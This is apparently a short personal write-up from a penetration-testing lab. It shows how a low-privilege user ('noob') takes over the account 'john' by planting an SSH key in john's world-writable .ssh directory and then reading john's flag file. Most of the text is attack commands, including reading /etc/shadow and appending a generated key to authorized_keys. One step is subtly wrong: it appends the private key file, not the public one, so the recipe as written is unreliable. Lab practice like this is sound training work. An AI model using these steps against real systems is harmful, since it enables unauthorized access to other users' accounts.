
[...back](../0-landing-ncsaoscp.md)

# 1 brief

iptarget
port: 22
mission: log in as other user than noob
access cred = noob:noob

---

# 2 identify... john

`cat /etc/shadow` >>> john exists

`ls -la ...` >>> no hidden, file permission secured

`file tampering` >>> likely impossible

next tier >>> `sshkey tampering`

---

# 3 generate new sshkey -> give it to john

```
ssh-keygen -t rsa -f /tmp/zaddykey -N ""
cat /tmp/zaddykey >> /home/john/.ssh/authorized_keys
ssh -i /tmp/zaddykey john@localhost
cat /home/john/flag*
```

```
(to check permission first, as noob -- necessary?)
> noob@machine-byjodzovf6e6jyc6v8fp-85263-7f4f5ddfc7-tlzws:~$ ls -la /home/john
>>> drwxrwxrwx 1 john john 4096 Jul 20  2022 .ssh
>>> -rw------- 1 john john   19 Nov  5 07:27 flag_Yzg1O.txt
```

---

[...back](../0-landing-ncsaoscp.md)
